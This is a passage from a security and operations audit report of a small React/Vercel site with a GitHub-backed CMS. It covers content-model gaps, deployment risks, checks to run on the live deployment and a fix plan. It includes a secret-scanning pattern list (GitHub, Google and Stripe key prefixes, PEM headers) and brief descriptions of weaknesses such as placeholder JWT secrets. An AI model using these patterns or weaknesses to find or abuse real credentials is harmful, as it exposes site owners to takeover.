| **OPS-06** | `README.md` is garbled placeholder text (`# a p a z`, `# k a k a z`) with UTF-16 artefacts — no setup, run, deploy or environment documentation exists | `README.md` |

---

# 📦 Content model and CMS coverage

Findings specific to how content is *modelled*, separate from the data-platform issues
above. Several are the reason the CMS feels unreliable to whoever operates it.

| ID | Sev | Finding | Location |
|---|---|---|---|
| **CNT-07** | 🟠 High | **~20% of rendered text is not editable in the admin at all.** Not covered by any form field: the entire `services[12]` array (the whole `/services` catalogue), `ielts.courseFeatures[4]`, `japanese.courseFeatures[4]`, `about.whyChooseTitle`/`whyChooseHighlight`, `servicesPage.categoriesTitle`/`categoriesHighlight`, all four `successPage` section titles, `footer.*` (including the rendered copyright line), and the `contact.*` details (CNT-06). The only route to these is the raw-JSON textarea — which is also the fastest way to brick the CMS (SEC-12). | `admin/panel.html` |
| **CNT-08** | 🟠 High | **`id` fields are positional indices re-derived on every save** — `{id: String(idx+1), ...}` at `panel.html:965,984,1012,1040,1061,1082`. Deleting destination #3 silently renumbers every destination below it. The namespace is only locally unique: `"1"` appears in 13 different arrays. Components already distrust it (`Destinations.tsx` keys on `country.name`, `Home.tsx` on the array index). Any future deep link (`/destinations/japan`), analytics event or lead attribution would be built on sand. | `admin/panel.html`, `site-content.json` |
| **CNT-09** | 🟠 High | **Fixed-arity arrays consumed by hard-coded index.** `IELTS.tsx:50,54,58,62` and `Japanese.tsx:50,54,58,62` render `courseFeatures[0]` … `[3]` individually. The array *must* contain exactly 4 items. There is no admin UI for it, so the only way to edit it is raw JSON — and leaving 3 items renders `undefined` into the page. | `IELTS.tsx`, `Japanese.tsx` |
| **CNT-10** | 🟠 High | **Icons are a positional array in the component, not in the content.** `Services.tsx:10` declares exactly 12 icons for exactly 12 services and does `icons[index % icons.length]`. Adding a 13th service in the admin silently wraps to the first icon. There is no `iconKey` field and no way for an editor to choose one. Same pattern in `About.tsx:12`. | `Services.tsx:10`, `About.tsx:12` |
| **CNT-11** | 🟠 High | **There is zero Bengali on the public site.** A repo-wide grep for Bengali codepoints (U+0980–U+09FF) returns exactly **one** match — a sentence in the admin panel, for the operator. All ~471 content values are English-only, with no `{en, bn}` shape, no locale key and no fallback chain. Compounding it: Playfair Display and Inter **ship no Bengali glyphs**, so any Bengali added today falls back to a system font and looks visibly broken. For a Tangail consultancy selling to students *and their parents*, this is a conversion problem, not just a technical gap. | `site-content.json`, `index.css:1` |
| **CNT-12** | 🟡 Med | **~10% of the content store is inert.** 44 of ~471 leaf values are empty strings, plus 4 placeholder `"#"` social links. Fields that are editable but rendered nowhere: `global.copyrightYear` (the *rendered* copyright is `footer.copyrightText`, which is **not** editable). Fields present in all records but always empty: `destinations[*].universities`, `destinations[*].students`, `successStories[*].program`, `successStories[*].year`, `ielts.courseStats.support`, both `ctaButton`s. | `site-content.json` |
| **CNT-13** | 🟡 Med | **Presentation modelled as content.** 15 `title` / `titleHighlight` pairs exist solely so one word can render gold, plus `titleSuffix` as a third fragment of the same sentence. An editor who fills `title` and leaves `titleHighlight` empty gets a dangling space, and cannot put the highlight in the middle. | `site-content.json` |
| **CNT-14** | 🟡 Med | **The same entity is modelled twice.** `successStories[6]` and `successPage.testimonials[4]` are both `{quote, attribution}`; one carries a photo and university, the other an anonymous `author`. They render on the same page. They should be one collection with optional fields. | `SuccessStories.tsx` |
| **CNT-15** | 🟡 Med | **Broken referential integrity in free-text keys.** `successStories[2].country = "Malaysia"`, but Malaysia is not among the 10 destinations (Australia, Canada, Italy, Malta, South Korea, UK, Japan, Cyprus, Russia, Denmark) — almost certainly a typo for Malta. `university` is free text with no `institutions` entity, so "Cheboksary Medical University" is retyped three times. `destinations[*].flag` stores a hand-typed emoji rather than an ISO country code. | `site-content.json:416` |
| **CNT-16** | 🟡 Med | **Derived values frozen as literals.** `destinationsPage.heroSubtitle` says *"Explore 10 countries"* — add an 11th and the page lies. The headline stats `500+` / `10+` / `50+` appear in `home.hero.stats`, are restated in prose in two `about` fields, **and are hardcoded again in React** at `SuccessStories.tsx:12-14` — four places to change one number. `"Register Now"` appears 5×; `2024` appears in two fields. | `site-content.json`, `SuccessStories.tsx` |
| **CNT-17** | 🟡 Med | **No field-type metadata.** ~30 fields are rendered through `RichText` (all `heroSubtitle`, `description`, `mission`, `vision`, …); the rest render as plain text. **Nothing in the model marks which is which.** An editor pasting `<b>` gets escaped output in one place and live HTML in another, with no way to tell — and no way for a reviewer to know which fields need sanitising (SEC-02). | `site-content.json`, `RichText.tsx` |

---

# 🛠️ Operations deep-dive

| ID | Sev | Finding | Location |
|---|---|---|---|
| **OPS-12** | 🟠 High | **Branch divergence is silent and undetectable.** `GITHUB_BRANCH` (`api/_lib/github.js:7`, defaults to `main`) and Vercel's production branch are configured independently, and nothing cross-checks them. If they ever differ, admin saves and `/api/content` use branch A while the static bundle keeps building from branch B. The site *appears* to update — until `/api/content` fails, at which point it silently reverts to content from the last build on branch B. Nobody would notice until that moment. | `api/_lib/github.js:7` |
| **OPS-13** | 🟠 High | **Conflict handling strands the editor.** GitHub returns 409 on a stale `sha`; `github.js:52-55` wraps it in a generic `Error` and `admin/content.js:53-54` returns **HTTP 500** with the raw GitHub body, so the client cannot distinguish a conflict from an outage. The operator sees `GitHub API error 409: {"message":...`. Worse, **`state.sha` is never refreshed on failure**, so every subsequent save also 409s — the only recovery is a page reload, which discards all unsaved work. Conflict granularity is the **entire site**: two editors on unrelated pages collide and one loses everything. | `admin/panel.html:1092-1112` |
| **OPS-14** | 🟡 Med | **The admin panel can disappear after a Vercel runtime update.** `api/admin-panel.js:36-37` does `fs.readFileSync(path.join(process.cwd(), 'admin', 'panel.html'))`. Vercel's Node runtime uses *static analysis* to decide which files to bundle into a function; a dynamic `process.cwd()` read is not traced, and `vercel.json` has no `functions.includeFiles`. This can ENOENT and take the admin offline with a 500. | `api/admin-panel.js:36-37` |
| **OPS-15** | 🟡 Med | **`--legacy-peer-deps` root cause identified: `lucide-react@0.453.0`.** Its peer range is `^16.5.1 \|\| ^17 \|\| ^18 \|\| ^19.0.0-rc` — which includes React 19 *release candidates* but **not stable `^19.0.0`**. Installed React is 19.2.1. It is the **only** dependency in the lockfile whose React peer range excludes 19 stable. Fix: bump to ≥0.460.0 and drop the flag — which currently disables peer checking for *every* package, so a future genuinely-incompatible upgrade will install silently and fail at runtime. The tree already carries a second copy (`lucide-react@0.542.0`, nested under `streamdown`). | `package.json:49`, `vercel.json:2` |
| **OPS-16** | 🟡 Med | **Builds are not reproducible.** `npm install` (not `npm ci`) means the lockfile is advisory, and ~70 direct deps carry `^` ranges — two builds of the same commit can differ. There is **no `.nvmrc` and no `engines` field**, so the Node major version is whatever Vercel defaults to today and will change without warning. | `vercel.json:2`, `package.json` |
| **OPS-17** | 🟡 Med | **No image pipeline.** `upload.js:6` caps at 5 MB with **no resizing, no WebP/AVIF conversion, no thumbnails and no `srcset`** — a 5 MB phone photo is served at full resolution into a 400×400 card. Uploads go through the Contents API as base64 (~1.37× overhead) and count against GitHub's ~500 content-mutating requests/hour. `listImagesRecursive` silently truncates at the Contents API's 1,000-entries-per-directory limit and is N+1 (one request per subdirectory). | `api/admin/upload.js`, `api/admin/images.js` |
| **OPS-18** | 🔵 Low | **Config debris.** `tsconfig.node.json` is never referenced from `tsconfig.json` (no `references` array), so its strict flags apply to nothing. `tsconfig.json` has no `resolveJsonModule` yet `CmsContext.tsx:2` imports JSON — it works only because `moduleResolution: "bundler"` implies it in TS 5.x. `.gitignore` ignores `*.db`/`*.sqlite` (there is no database) and `.pnpm-store/` (the lockfile is npm's), while `pnpm@^10.15.1` sits in devDependencies — three package managers implied by one project. `add@^2.0.6` is a junk package from a mistyped `npm install`. `streamdown` is unused but transitively pulls **mermaid, katex, shiki and the whole unified/remark stack**, inflating every build. | various |

> **Note on `studyhubbdwadmin-main.zip`:** one reviewer flagged it as a possible
> pre-scrub credential leak and did not open it. It **was** subsequently extracted and
> audited in isolation: it is **byte-identical to the working tree, contains no `.git`,
> no `.env`, and no secrets** (`ghp_`, `github_pat_`, `AIza`, `sk_live` and PEM headers
> all return zero hits). It is pure bloat — delete it and add `*.zip` to `.gitignore`.
> Rotating `GITHUB_TOKEN` is still warranted on the separate grounds in OPS-05.

---

# ⚠️ Must verify against the live deployment

These cannot be settled from source alone. Check them before the renovation starts.

| ID | What to verify | How | Why it matters |
|---|---|---|---|
| **OPS-07** | **SPA deep-link fallback.** `vercel.json` defines a `rewrites` array containing only the `/admin` rule, and there is no catch-all to `/index.html` | Open `https://<site>/ielts` **directly** (not by clicking through from `/`) in a fresh tab | If it 404s, **7 of 8 pages are unreachable from search results, ads and shared links.** Fix: append `{ "source": "/((?!api/).*)", "destination": "/index.html" }` |
| **OPS-08** | Whether `JWT_SECRET` / `ADMIN_PASSWORD` in Vercel are still the `.env.example` placeholders | Vercel → Settings → Environment Variables | Placeholder values mean anyone can mint admin tokens offline |
| **OPS-09** | Whether the `GITHUB_TOKEN` is a classic PAT with full `repo` scope | GitHub → Settings → Developer settings → Tokens | Determines the real blast radius of SEC-04 |
| **OPS-10** | Whether any PAT was ever committed before the history was stripped | GitHub security alerts / token scanning | If so, rotate immediately regardless |
| **OPS-11** | Whether `VITE_FRONTEND_FORGE_API_KEY` is set in Vercel | Vercel env vars | Any `VITE_`-prefixed variable is **inlined into the public JS bundle**. `Map.tsx` is dead code, so this key should simply be removed |

---

# What is actually good

Worth preserving through the renovation:

- The password comparison in `login.js:26-35` and `admin-panel.js:9-16` is genuinely
  constant-time — someone thought about timing attacks.
- Every `/api/admin/*` handler calls `requireAuth` before doing any work. There are no
  missing authorisation checks.
- GitHub's `sha` parameter provides real optimistic locking on content writes.
- Every `target="_blank"` carries `rel="noopener noreferrer"` consistently.
- Pages are cleanly data-driven from a single context — swapping the CMS backend later
  touches one file, not nine.
- `strict: true` is on in `tsconfig.json` and is not bypassed with `any` outside `ui/`.
- Routes are clean, readable, SEO-friendly slugs, and a 404 catch-all exists.
- `.env` is correctly gitignored, and **no secrets were found anywhere in the tree or in
  the committed zip**.

---

# Prioritised fix order

| # | Action | Findings | Effort |
|---|---|---|---|
| 1 | **Rotate every secret.** Fine-grained PAT (`Contents: write`, one repo), strong `ADMIN_PASSWORD` and `JWT_SECRET`, refuse placeholders at startup | SEC-04, SEC-05, OPS-08/09/10 | 1 h |
| 2 | **Delete `client/public/admin.html`** | SEC-03 | 5 min |
| 3 | **Fix the image-delete path check** and URL-encode path segments in `github.js` | SEC-01 | 30 min |
| 4 | **Verify the SPA deep-link fallback** and add the rewrite if needed | OPS-07 | 15 min |
| 5 | **Make the contact form work** — or remove it today so leads stop being silently lost | BIZ-01 | 1 day |
| 5b | **Point `Contact.tsx` at `global.*`** so the office phone/email/address become editable at all | CNT-06 | 30 min |
| 6 | **Sanitise `RichText` with DOMPurify** + `safeUrl` helper + zod content schema on read and write | SEC-02, SEC-07, SEC-12, FE-02 | 1 day |
| 7 | **Add global security headers** (move admin inline scripts out first) | SEC-08 | 2 h |
| 8 | **Add SEO metadata**, favicon, `robots.txt`, `sitemap.xml`, and remove `maximum-scale=1` | SEO-01, A11Y-01 | 4 h |
| 9 | **Rate-limit both login paths**; harden the JWT (`exp`, `role`, `timingSafeEqual`, shorter TTL) | SEC-05, SEC-11 | 4 h |
| 10 | **Cache `/api/content`** at the CDN | SEC-06 | 30 min |
| 11 | **Harden uploads** — drop SVG, match extension to MIME, check magic bytes | SEC-10 | 2 h |
| 12 | **Fix the content** — real images, live social links, current year, correct map URL | CNT-01, CNT-02, CNT-03 | 2 h |
| 13 | **Fix the colour contrast** across the palette | A11Y-02 | 3 h |
| 14 | **Add ESLint + typecheck + smoke tests to CI** | OPS-01 | 4 h |
| 15 | **Delete dead code**, unused deps, the zip, and the Manus residue; rewrite the README | FE-09 to FE-13, OPS-03, OPS-06, OPS-18 | 3 h |
| 16 | **Close the CMS coverage gaps** — make `services[]`, `courseFeatures[]`, footer and section titles editable; add `iconKey` to the content model | CNT-07, CNT-09, CNT-10 | 1 day |
| 17 | **Fix conflict handling** — return 409 as 409, refresh the `sha`, and show a real conflict message | OPS-13 | 3 h |
| 18 | **Pin the toolchain** — `npm ci`, bump `lucide-react` and drop `--legacy-peer-deps`, add `.nvmrc` and `engines` | OPS-15, OPS-16 | 2 h |

Items 1–4 are same-day and close the exploitable paths. Items 5 and 5b stop the revenue
leak and make the business's own phone number editable.
See [`REMEDIATION-PLAN.md`](./REMEDIATION-PLAN.md) for the phased plan and the target
architecture for new features.
